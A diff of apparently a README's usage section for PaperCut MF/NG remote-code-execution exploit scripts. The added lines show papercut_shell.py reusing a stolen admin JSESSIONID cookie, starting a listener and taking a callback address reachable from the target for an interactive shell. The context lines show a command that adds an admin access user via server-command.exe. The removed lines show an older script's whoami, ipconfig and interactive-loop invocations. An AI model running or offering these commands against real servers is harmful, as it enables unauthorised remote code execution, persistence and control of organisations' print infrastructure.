@@ -24,16 +24,13 @@ python3 papercut_external_lookup_rce.py 10.0.0.5 \
   --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-admin-access-user svc_backup"'
 
 
-# pcut2025
+# Easiest path: log into the admin UI in a browser, grab JSESSIONID, reuse it
+python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID
 
-### Single command
-python3 papercut_setupcompleted_rce.py -u http://192.168.1.100:9191 -c "cmd.exe /c whoami > C:\proof.txt"
+# Or let the tool start the listener and run one command
+python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
+    -c "whoami"
 
-### Default command (whoami)
-python3 papercut_setupcompleted_rce.py -u https://papercut.company.com
-
-### Interactive command loop
-python3 papercut_setupcompleted_rce.py -u http://192.168.1.100:9191 -i
-
-### Verbose with TLS (cert verification off by default)
-python3 papercut_setupcompleted_rce.py -u https://papercut.target.com:9192 -v --verify -c "ipconfig /all"
+# Interactive, with an explicit callback IP/port (must be reachable FROM the target)
+python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
+    --callback http://10.0.40.83:8081
